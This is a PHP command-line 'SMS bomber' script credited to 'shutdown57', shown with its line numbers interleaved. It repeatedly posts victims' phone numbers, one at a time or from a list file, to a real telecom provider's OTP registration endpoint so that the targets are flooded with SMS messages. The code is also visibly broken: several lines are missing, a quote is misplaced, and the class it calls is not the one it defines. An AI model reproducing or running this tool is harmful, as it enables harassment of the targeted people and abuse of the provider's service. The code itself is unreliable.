<?php 
2
/**
3
* SMS BOOMBER MULTI API RANDOM.
4
* @author shutdown57 < alinkokomansuby@gmail.com >
5
* 
6
*/
7
8
error_reporting(0);
9
10
Class __shutdown57{
11
12
 	/** Add Your Api here **/
13
	public static $API_URL = [
22
		'tri'    =>  ['url' => 'https://registrasi.tri.co.id/daftar/generateOTP',
23
					  'postdata' => 'msisdn={h4ck3remj_nomerHP}',
24
					  'success' => '"code":"200"'
25
					]
26
					];
27
28
	public static $readLine;
29
30
	public function __banner()
31
	{
32
		print
33
"
34
     
35
36
 	+-------------- [ EMJ BLASTER]
37
 	  +-------------------------------------------[ 2019 ]
38
";
39
	}
40
	public function __Boom($url,$data)
41
	{
42
		$c = curl_init();
43
		$s = array(
44
			CURLOPT_URL => $url,
45
			CURLOPT_POST=>true,
46
			CURLOPT_POSTFIELDS=>$data,
47
			CURLOPT_RETURNTRANSFER=>true,
48
			CURLOPT_USERAGENT=>"Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
49
			);
50
		curl_setopt_array($c,$s);
51
		return curl_exec($c);
52
		curl_close($c);
53
	}
54
	public function __stuck($text = "Input number / List Number")
55
	{
56
		echo PHP_EOL;
57
		echo "shutdown57:: {$text} >>";
58
		self::$readLine = rtrim(fgets(STDIN));
59
	}
60
	public function __rapi($text,$lenght,$isi)
61
	{
62
		return str_pad(strtoupper($text),$lenght,$isi,STR_PAD_BOTH);
63
	}
64
	public function __action()
65
	{
66
		$read = self::$readLine;
67
		if(preg_match("/([0-9]{10,16})/",$read))
68
		{
69
			echo "[!] Detected phone number ~ ".PHP_EOL;
70
			echo "[!] $read :: Targeted ~".PHP_EOL;
71
72
			
73
			echo PHP_EOL;
74
			self::__stuck('How much boom to send?');
75
			$boom=self::$readLine;
76
			self::__stuck('How much delay to proccess?');
77
			$delay=self::$readLine;
78
			for($i=1;$i<=$boom;$i++)
79
			{
80
			$api = array_rand(self::$API_URL);
81
			$post = str_replace("{h4ck3remj_nomerHP}",$read,self::$API_URL[$api]['postdata']);
82
			if(preg_match("/".self::$API_URL[$api]['success']."/",self::__Boom(self::$API_URL[$api]['url'],$post)))
83
			{
84
				echo "[$i][SUCCESS] ".self::__rapi($api,10," ")." :: $read ./h4ck3remj".PHP_EOL;
85
			}else{
86
				echo "[$i][FAILED ] ".self::__rapi($api,10," ")." :: $read ./h4ck3remj".PHP_EOL;
87
			}
88
			sleep($delay);
89
			}
90
		}elseif(preg_match("/txt/",$read) || is_file($read))
91
		{
92
			echo "[!] Detected file list number $read ~".PHP_EOL;
93
			$nlist = explode(PHP_EOL,@file_get_contents($read));
94
			foreach($nlist as $no)
95
			{
96
				echo "[!] $no :: Targeted ~".PHP_EOL;
97
			}
98
			echo PHP_EOL;
99
			self::__stuck('How much boom to send?');
100
			$boom=self::$readLine;
101
			self::__stuck('How much delay to proccess?');
102
			$delay=self::$readLine;
103
			foreach($nlist as $nmr)
104
			{
105
				for($i=1;$i<=$boom;$i++)
106
				{
107
					$api = array_rand(self::$API_URL);
108
					$post = str_replace("{h4ck3remj_nomerHP}",$nmr,self::$API_URL[$api]['postdata']);
109
					if(preg_match("/".self::$API_URL[$api]['success']."/",self::__Boom(self::$API_URL[$api]['url'],$post)))
110
					{
111
						echo "[$i][SUCCESS] ".self::__rapi($api,10," ")." :: $nmr ./h4ck3remj ".PHP_EOL;
112
					}else{
113
						echo "[$i][FAILED ] ".self::__rapi($api,10," ")." :: $nmr ./"h4ck3remj.PHP_EOL;
114
					}
115
					sleep($delay);
116
			}
117
			}
118
		}else{
119
			die('Input not correct ~'.PHP_EOL);
120
		}
121
	}
122
	public function __run__bom_bom()
123
	{
124
		self::__banner();
125
		self::__stuck();
126
		self::__action();
127
128
	}
129
130
}
131
132
__h4ck3remj::__run__bom_bom();
133
?>
